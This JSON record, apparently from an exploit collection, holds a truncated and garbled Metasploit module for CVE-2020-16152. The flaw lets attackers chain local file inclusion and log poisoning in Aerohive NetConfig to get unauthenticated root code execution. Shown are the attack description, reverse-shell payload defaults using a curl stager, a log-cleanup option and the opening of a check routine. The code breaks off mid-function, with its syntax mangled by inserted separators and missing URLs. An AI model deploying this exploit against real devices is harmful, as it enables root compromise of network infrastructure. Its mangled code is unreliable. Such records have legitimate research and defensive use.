{
    "text": "vul_name : Aerohive NetConfig 10.0r8a Local File Inclusion / Remote Code Execution ， vul_cve : CVE-2020-16152 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Aerohive NetConfig 10.0r8a LFI and log poisoning to RCE' ,  ， 'Description' => %q{ ， This module exploits LFI and log poisoning vulnerabilities ，  ( CVE-2020-16152 ) in Aerohive NetConfig , version 10.0r8a ， build-242466 and older in order to achieve unauthenticated remote ， code execution as the root user. NetConfig is the Aerohive/Extreme ， Networks HiveOS administrative webinterface. Vulnerable versions ， allow for LFI because they rely on a version of PHP 5 that is ， vulnerable to string truncation attacks. This module leverages this ， issue in conjunction with log poisoning to gain RCE as root. ， Upon successful exploitation , the Aerohive NetConfig application ， will hang for as long as the spawned shell remains open. Closing ， the session should render the app responsive again. ， The module provides an automatic cleanup option to clean the log. ， However , this option is disabled by default because any modifications ， to the /tmp/messages log , even via sed , may render the target ，  ( temporarily ) unexploitable. This state can last over an hour. ， This module has been successfully tested against Aerohive NetConfig ， versions 8.2r4 and 10.0r7a. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Erik de Jong' ,  # github.com/eriknl - discovery and PoC ， 'Erik Wynter' #  @ wyntererik - Metasploit ，  ]  ,  ， ' ，  [ 'CVE' , '2020-16152' ]  ,  # still categorized as RESERVED ，  [ 'URL' , ' # analysis and PoC code ，  ]  ,  ， 'DefaultOptions' => { ， 'SSL' => true ,  ， 'RPORT' => 443 ， } ,  ， 'Platform' => %w [ linux unix ]  ,  ， 'Arch' => [ ARCH_ARMLE , ARCH_CMD ]  ,  ， 'Targets' => [  ，  [  ， 'Linux' , { ， 'Arch' => [ ARCH_ARMLE ]  ,  ， 'Platform' => 'linux' ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp' ,  ， 'CMDSTAGER : FLAVOR' => 'curl' ， } ， } ，  ]  ,  ，  [  ， 'CMD' , { ， 'Arch' => [ ARCH_CMD ]  ,  ， 'Platform' => 'unix' ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_openssl' # this may be the only payload that works for this target' ， } ， } ，  ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'DisclosureDate' => '2020-02-17' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ， register_options [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to Aerohive NetConfig' , '/' ]  )  ,  ， OptBool.new ( 'AUTO_CLEAN_LOG' ,  [ true , 'Automatically clean the /tmp/messages log upon spawning a shell. WARNING ! This may render the target unexploitable' , false ]  )  ,  ，  ]  ， end ， def auto_clean_log ， datastore [ 'AUTO_CLEAN_LOG' ]  ， end ， def check ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path , 'index.php5' )  ， } )  ， unless res",
    "time": "2021.11.14"
}